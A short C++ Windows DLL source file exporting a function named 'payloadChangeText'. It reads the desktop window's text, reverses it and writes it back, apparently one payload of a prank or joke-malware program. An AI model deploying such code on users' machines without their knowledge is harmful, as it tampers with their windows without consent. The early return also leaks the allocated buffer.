#include "pch.h"

extern "C" __declspec(dllexport) void payloadChangeText() {
	HWND hwnd = GetDesktopWindow();
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		int len = lstrlenW(str);

		if (len <= 1)
			return;

		WCHAR c;
		int i, j;
		for (i = 0, j = len - 1; i < j; i++, j--) {
			c = str[i];
			str[i] = str[j];
			str[j] = c;
		}

		for (i = 0; i < len - 1; i++) {
			if (str[i] == L'\n' && str[i + 1] == L'\r') {
				str[i] = L'\r';
				str[i + 1] = L'\n';
			}
		}
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);
}

